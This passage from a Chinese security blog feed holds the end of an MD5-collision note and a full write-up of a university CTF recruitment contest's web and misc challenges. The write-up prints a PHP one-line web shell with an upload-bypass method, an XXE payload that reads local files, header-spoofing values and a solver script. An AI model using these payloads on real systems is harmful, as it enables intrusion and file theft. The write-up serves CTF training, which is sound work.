number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2</code></pre><p>值不等，md5相等即可。md5碰撞。</p><hr><h2 id="0e开头MD5的MD5为0e的MD5"><a href="#0e开头MD5的MD5为0e的MD5" class="headerlink" title="0e开头MD5的MD5为0e的MD5"></a>0e开头MD5的MD5为0e的MD5</h2><p>0e215962017 </p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>S3cCTF-出题人gyy-Writeup</title>
      <link href="article/S3cCTF-gyy-Writeup/"/>
      <url>article/S3cCTF-gyy-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="S3cCTF-gyy-Writeup"><a href="#S3cCTF-gyy-Writeup" class="headerlink" title="S3cCTF-gyy-Writeup"></a>S3cCTF-gyy-Writeup</h1><p><strong>出题人：gyy</strong></p><p><strong>写在前面：</strong></p><p>本次招新赛我主要负责WEB方面的出题，当然兼顾一些MISC，本着简单易懂的原则，刚开始出了很多简单WEB题，但是这届新生的实力明显比我们当时强= =，后期又赶了一些提升题，当然和真正的CTF比赛还是有非常大的距离，例如在群里放出的周六的题目可以看出。所以，这些只是入门CTF的基础，去年的这时，我们参加的招新比赛比今年更加困难（所以今年我有同感地出了不少简单题），我希望大家不要止步于此，当初我也有一腔热血，觉得CTF不过如此（甚至还想双修）。但，走的越高，越会发现自己越渺小，这条道路可能还没有尽头。技术可以后期培养，这次招新比赛分数也只能作为检测基础的测试，如果你有强烈的意向和兴趣，比比赛成绩更为重要，我们欢迎你和我们联系，希望大家不忘初心，砥砺前行。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="How-to-solve-ctf"><a href="#How-to-solve-ctf" class="headerlink" title="How_to_solve_ctf"></a>How_to_solve_ctf</h2><h3 id="出题解析"><a href="#出题解析" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在指引大家，考了一下HTML的知识</p><h3 id="解题方式"><a href="#解题方式" class="headerlink" title="解题方式"></a>解题方式</h3><p>F12查看源代码，给了提示<code>&lt;!-- html元素是可以修改的 --&gt;</code><br>修改form表单里input文本框的长度限制，提交s3c2020即可获得flag<br>由于是GET传参，也可以直接传<code>key=s3c2020</code>即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122173122547.png" class="" title="web1"><hr><h2 id="nof12"><a href="#nof12" class="headerlink" title="nof12"></a>nof12</h2><h3 id="出题解析-1"><a href="#出题解析-1" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题利用script限制了鼠标右键和f12</p><h3 id="解题方式-1"><a href="#解题方式-1" class="headerlink" title="解题方式"></a>解题方式</h3><p>与题目 <strong>S3C_NOT_BAD</strong> 重复，Ctrl+U或者burp抓包或者curl访问都可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174018834.png" class="" title="web2"><hr><h2 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h2><h3 id="出题解析-2"><a href="#出题解析-2" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在考XFF（X-Forwarded-For）和Referer<br>伪造地址三种方式：</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><h3 id="解题方式-2"><a href="#解题方式-2" class="headerlink" title="解题方式"></a>解题方式</h3><p>只有本地管理员才能访问本页面！<br>burp抓包修改即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174702383.png" class="" title="web3"><hr><h2 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h2><h3 id="出题解析-3"><a href="#出题解析-3" class="headerlink" title="出题解析"></a>出题解析</h3><p>302重定向</p><pre class="language-php" data-language="php"><code class="language-php">//flag.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Flag: '</span><span class="token punctuation">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s3c&#123;0H_mY_g0d_its_4O4&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//修改 X-Powered-By信息</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:404.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">//404.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Not Found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- 才怪 --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http/1.1 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"status: 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>The requested URL /flag.php was not found on this server.&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><h3 id="解题方式-3"><a href="#解题方式-3" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开点击后跳转Not Found，仔细看发现界面是伪造的</p><img src="/article/S3cCTF-gyy-Writeup/20201122175207502.png" class="" width="404"><p>因为界面是我自己写的假界面，特意写了个注释，由此想到重定向<br>直接在header里能看到flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175439466.png" class="" title="flag"><p>拿去base64解一下即可获得flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175814189.png" class="" title="base64"><hr><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><h3 id="出题解析-4"><a href="#出题解析-4" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考查PHP和Python脚本，3秒内…有人能做得到嘛？</p><p>本题网上找一个脚本改改完全没问题，其实还有一题计算字符串（原创题目前网上没有脚本），师傅们说不放就没放啦，有兴趣可以做做 <a href="http://49.234.89.193:8088/">题目链接</a>(链接可能会挂，题目随时可能哪天我就关了…)</p><h3 id="解题方式-4"><a href="#解题方式-4" class="headerlink" title="解题方式"></a>解题方式</h3><p>请在3秒内计算以下算式并提交并提交<br>在服务器设的SESSION，3秒刷新，超时也是不算的<br>设了个小坑，抓个包可以看到，每次提交的请求还有个参数<code>submits=提交</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122180918644.png" class="" title="参数"><p>如果没有就会die退出</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"少了点东西啊...好好看看吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后放出Payload，师傅们可以自己研究</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/11/22 18:14@Auth ： gyy@File ：1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://49.234.89.193:8029/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submits"</span> <span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1--------------------取算式"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> response<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2--------------------计算算式"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3--------------------提交"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resultres <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span> data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122181549903.png" class="" title="calnum"><p>本人蹩脚自学的python，语法规范问题请见谅</p><hr><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="出题解析-5"><a href="#出题解析-5" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察Linux下Vim的应用，同时考察PHP代码审计及robots协议</p><p>给了hint：vim强退会在当前目录生成生成备份文件</p><h3 id="解题方式-5"><a href="#解题方式-5" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开先看源代码</p><img src="/article/S3cCTF-gyy-Writeup/20201122192109829.png" class="" title="vim"><p>Recover<br>Linux中，如果vim强退的话（ctrl+z）就会在目录下生成备份文件，如图所示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192350871.png" class="" title="ctrl+z"><p>而再vim编辑就会有如下提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192439588.png" class="" title="re"><p>直接Recover恢复即可。</p><p>根据提示，访问./.index.php.swp。发现下载.swp文件<br>这里注意，备份文件是隐藏文件，文件名前面有个点<br>拿去linux系统恢复，可以发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122192914742.png" class="" title="flag1"><p>由此，flag分为多部分<br>接下来代码审计很简单，回到index.php，POST传参</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>pazzword<span class="token operator">=</span>a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122193206215.png" class="" title="flag2"><p>机器人会告诉你剩下的，联想robots协议，访问./robots.txt</p><img src="/article/S3cCTF-gyy-Writeup/20201122193300252.png" class="" title="robots"><p>可得flag在./r/o/b/o/a/t/s/1.php</p><img src="/article/S3cCTF-gyy-Writeup/20201122193344579.png" class="" title="flag3"><p>将三段flag组合即可</p><hr><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="出题解析-6"><a href="#出题解析-6" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察文件上传，考察上传绕过的姿势，因为比赛限制，没有出太难的过滤</p><h3 id="解题方式-6"><a href="#解题方式-6" class="headerlink" title="解题方式"></a>解题方式</h3><p>当然，不是真的让你上传个动图。。我服务器里发现了好多奇奇怪怪的图片<br>一般文件上传一句话木马直接获取shell<br><code>&lt;?php @eval($_POST[gyy])?&gt;</code><br>需要能被php解析才行，.txt,.gif都是不可被解析的<br>或者直接用script标签<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[gyy]);&lt;/script&gt;</code><br>后缀名限制</p><img src="/article/S3cCTF-gyy-Writeup/20201122194102133.png" class="" title="php"><p>上传普通图片，被过滤</p><img src="/article/S3cCTF-gyy-Writeup/20201122193716205.png" class="" title="gif"><p>抓包上传,原始如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122194225470.png" class="" title="post1"><p>修改如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122195020428.png" class="" title="post2"><p>请求头检查：content-type，MIME类型限制，修改为<code>image/gif</code><br>文件后缀绕过：只要能被php解析的文件名就可以<br>这里我只限制了<code>.php</code>,<code>.php3</code>,<code>.php4</code>,<code>.php5</code><br>MIME类型限制只允许<code>image/gif</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122195119845.png" class="" title="upload"><p>然后访问文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122195246767.png" class="" title="upload2"><p>发现代码被执行了，直接蚁剑连上get shell</p><img src="/article/S3cCTF-gyy-Writeup/20201122195418743.png" class="" title="upload3"><p>根目录发现flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122195438365.png" class="" title="upload4"><p>你们真的传了一堆堆奇奇怪怪的图片。。。</p><hr><h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External Entity</h2><h3 id="出题解析-7"><a href="#出题解析-7" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察XXE注入，即 XML实体注入</p><h3 id="解题方式-7"><a href="#解题方式-7" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开直接给phpinfo，源代码有提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122195910990.png" class="" title="hint"><p>底部发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122195933621.png" class="" title="system"><p>其实是执行了<code>system(&quot;ls&quot;);</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122200056166.png" class="" title="index"><p>然后每个文件都高亮了语法，<code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。存在的XXE漏洞具体可以百度研究一下。<br>样例Payload：</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122200729886.png" class="" title="dom"><p>其实还可以利用写入一句话木马等操作。</p><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="信息搜索"><a href="#信息搜索" class="headerlink" title="信息搜索"></a>信息搜索</h2><h3 id="出题解析-8"><a href="#出题解析-8" class="headerlink" title="出题解析"></a>出题解析</h3><p>信息搜索也是门技术，好好利用搜索引擎可以达到事半功倍的效果.<br>确实，只要仔细搜索，没有任何问题</p><h3 id="解题方式-8"><a href="#解题方式-8" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开五道题，一道道解决</p><h4 id="1-截至2020年10月31日，RFC最新的正式文档编号是多少"><a href="#1-截至2020年10月31日，RFC最新的正式文档编号是多少" class="headerlink" title="1.截至2020年10月31日，RFC最新的正式文档编号是多少?"></a>1.截至2020年10月31日，RFC最新的正式文档编号是多少?</h4><p>RFC文档，Request For Comments，官网连<em>科学上网</em>都不需要</p><img src="/article/S3cCTF-gyy-Writeup/20201122201134715.png" class="" title="rfc"><p>访问<code>https://www.ietf.org/</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201307663.png" class="" title="rfc"><p>或者直接访问RFC文档搜索网站<code>https://www.rfc-editor.org/search/rfc_search.php</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201725572.png" class="" title="rfc"><p>截至2020年10月31日，一查</p><img src="/article/S3cCTF-gyy-Writeup/20201122201943714.png" class="" title="rfc"><p>最新为RFC8940<br>这种东西最标准还是去官网查</p><h4 id="2-国家网络安全宣传周第一届是在哪一年举行的？"><a href="#2-国家网络安全宣传周第一届是在哪一年举行的？" class="headerlink" title="2.国家网络安全宣传周第一届是在哪一年举行的？"></a>2.国家网络安全宣传周第一届是在哪一年举行的？</h4><p>2014</p><img src="/article/S3cCTF-gyy-Writeup/20201122202110805.png" class="" width="2014"><h4 id="3-本校校园卡上对应的教学楼是主校区的几号教学楼？"><a href="#3-本校校园卡上对应的教学楼是主校区的几号教学楼？" class="headerlink" title="3. 本校校园卡上对应的教学楼是主校区的几号教学楼？"></a>3. 本校校园卡上对应的教学楼是主校区的几号教学楼？</h4><p>拿出来看看…百度地图打开，</p><img src="/article/S3cCTF-gyy-Writeup/20201122202320233.png" class="" width="1"><p>全景地图</p><img src="/article/S3cCTF-gyy-Writeup/20201122202433684.png" class="" width="1"><p>有点老，仔细观察地图，只有1教有那么大地方，2教3教都不会有那么大的中央空地<img src="/article/S3cCTF-gyy-Writeup/20201122202751489.jfif" class="" width="1"><br>good</p><h4 id="4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"><a href="#4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？" class="headerlink" title="4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"></a>4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？</h4><p>33<br>招新PPT上写的，学校公众号也能查到</p><h4 id="5-截至目前最新的C语言标准是C多少？"><a href="#5-截至目前最新的C语言标准是C多少？" class="headerlink" title="5. 截至目前最新的C语言标准是C多少？"></a>5. 截至目前最新的C语言标准是C多少？</h4><p>18<br>C标准以年号结尾命名，有人问为什么不是C99,C11….我只能说，现在最新的是C18，百度好好查查吧…（2年了）</p><p>全部答对给flag，不行爆破也行</p><hr><h2 id="myid"><a href="#myid" class="headerlink" title="myid"></a>myid</h2><h3 id="出题解析-9"><a href="#出题解析-9" class="headerlink" title="出题解析"></a>出题解析</h3><p>社工大佬，怕了怕了</p><h3 id="解题方式-9"><a href="#解题方式-9" class="headerlink" title="解题方式"></a>解题方式</h3><p>原本考爆破的，后来干脆直接你们社工算了…</p><img src="/article/S3cCTF-gyy-Writeup/20201122203410982.png" class="" title="id"><p>打开去掉disable标签</p><img src="/article/S3cCTF-gyy-Writeup/2020112220344579.png" class="" title="id"><p>下面提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122203500307.png" class="" title="id"><p>原来想考爆破，最后都知道了…id是我学号，直接开始社工，索性改分类为MISC。<br>再给个hint：<code>计算机院 2019 懂？</code><br>首先2019级即前5位为<code>12019</code><br>计算机院为050-055(大概）<br>所以前八位<code>1201905x</code>，爆破一下就好了。<br>当然也有问学长学姐的，问墙的，翻我空间的，查学校名册的，都可以。这题就当玩玩233333<br>ID:12019054018</p><img src="/article/S3cCTF-gyy-Writeup/20201122203854684.png" class="" title="id"><hr><h2 id="flag-jpg"><a href="#flag-jpg" class="headerlink" title="flag.jpg"></a>flag.jpg</h2><h3 id="出题解析-10"><a href="#出题解析-10" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察工具利用以及查看属性</p><h3 id="解题方式-10"><a href="#解题方式-10" class="headerlink" title="解题方式"></a>解题方式</h3><p>小戈:give me a flag 一看属性竟然用 SteganPEG 而且还没那么简单</p><p>提示很明显，用软件 SteganPEG ，密码就是<code>givemeaflag</code>（生怕你们看不见），其实正规地方在文件的属性里</p><img src="/article/S3cCTF-gyy-Writeup/20201122204149398.png" class="" title="flag"><p>软件读文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122204353880.png" class="" title="flag"><p>拖出来打开就是flag</p><hr><h2 id="Manchester"><a href="#Manchester" class="headerlink" title="Manchester"></a>Manchester</h2><h3 id="出题解析-11"><a href="#出题解析-11" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察 学习理解能力 百度曼彻斯特编码</p><h3 id="解题方式-11"><a href="#解题方式-11" class="headerlink" title="解题方式"></a>解题方式</h3><p>大白话解释：低电平是0，高电平是1。<br>曼彻斯特编码<code>01-&gt;1</code> <code>10-&gt;0</code><br>当时出这题用的C写的，蹩脚的东西看看就好…</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> a1<span class="token punctuation">,</span>a2<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span>a1<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'0'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'1'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>a1<span class="token operator">&amp;&amp;</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> </code></pre><p>得到<code>011100110011001101100011011110110100110101100001011011100100001101101000010001010111001101110100011001010111001001011111011101110011000101110100011010000101111100110000001100010011000001111101</code><br>复制去二进制转字符，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/2020112220515011.png" class="" title="man"><hr><h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><h3 id="出题解析-12"><a href="#出题解析-12" class="headerlink" title="出题解析"></a>出题解析</h3><p>水题，考察知识面，和搜索…</p><h3 id="解题方式-12"><a href="#解题方式-12" class="headerlink" title="解题方式"></a>解题方式</h3><p>真的水题，搜索标题<code>SlientEye</code>，是的，这是个软件<br>默认设置解密，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/20201122205451153.png" class="" title="slient"><hr><h2 id="Plaintext"><a href="#Plaintext" class="headerlink" title="Plaintext"></a>Plaintext</h2><h3 id="出题解析-13"><a href="#出题解析-13" class="headerlink" title="出题解析"></a>出题解析</h3><p>写的很清楚，明文攻击<br>给了hint，暗示伪加密<br>开赛题坚持了这么久我没想到…</p><h3 id="解题方式-13"><a href="#解题方式-13" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开发现压缩包三文件全加密，压缩包里的注释</p><pre class="language-none"><code class="language-none">亲眼所见，亦非真实也许是虚伪的，也许需要AZPR</code></pre><p>明示软件AZPR，这是个爆破软件<br>伪加密百度有一篇很详细的文章<br>修改加密位为<code>00</code>，不知道哪个文件是伪加密直接所有加密位为<code>00</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122210335385.png" class="" width="00"><p>保存后解压只有副本那个文件可以保存，其他两个文件是真加密</p><img src="/article/S3cCTF-gyy-Writeup/20201122210502282.png" class="" width="00"><p>根据明文攻击方法，将这个文件打包zip然后去题目再下一遍原文件,此时文件被修改，也可以改回去</p><p>用AZPR选择明文攻击即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122210917960.png" class="" title="在这里插入图片描述"><p>可以看到密钥被恢复了，不用找密码了，直接可以保存</p><img src="/article/S3cCTF-gyy-Writeup/20201122211504935.png" class="" title="在这里插入图片描述"><p>保存文件，其实已经破解出来了</p><img src="/article/S3cCTF-gyy-Writeup/20201122210823677.png" class="" title="在这里插入图片描述"><p>或者用rbkcrack也可以<br>直接打开flag.txt得flag</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XFF </tag>
            
            <tag> XXE </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 明文攻击 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 HECTF Write-up</title>
      <link href="article/2020-HECTF-Write-up/"/>
      <url>article/2020-HECTF-Write-up/</url>
      
